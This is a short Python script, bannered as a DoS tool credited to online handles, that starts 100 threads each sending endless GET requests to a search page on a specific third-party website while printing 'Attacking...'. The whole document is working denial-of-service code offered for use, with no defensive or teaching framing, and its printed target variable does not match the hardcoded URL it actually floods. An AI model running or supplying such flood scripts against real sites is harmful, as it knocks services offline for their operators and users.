import threading
import requests
import random

WEB = "http://target.com"
THREADS = 100

art = """
____ _  _ ____ ____ _  _ ____ ____ ___     ___  ____ ____    ____ ____ ____ _ ___  ___
|  | |  | |___ |__/ |__| |___ |__| |  \    |  \ |  | [__     [__  |    |__/ | |__]  |
|__|  \/  |___ |  \ |  | |___ |  | |__/    |__/ |__| ___]    ___] |___ |  \ | |     |

                                                       By Woz, Sh3llm4sk & Case
"""

def create_threads(threads):
    for _ in range(threads):
        t = threading.Thread(target=work)
        t.start()

def work():
    while True:
        requests.get("http://fnff.es/Buscador.aspx?search=sgtZISsNfC8%3d")

def main():
    print(art)
    print('Target: ' + WEB)
    print('Threads: ' + str(THREADS))
    create_threads(THREADS)
    print('All threads created!')
    print('Attacking...')

if __name__ == "__main__":
    main()
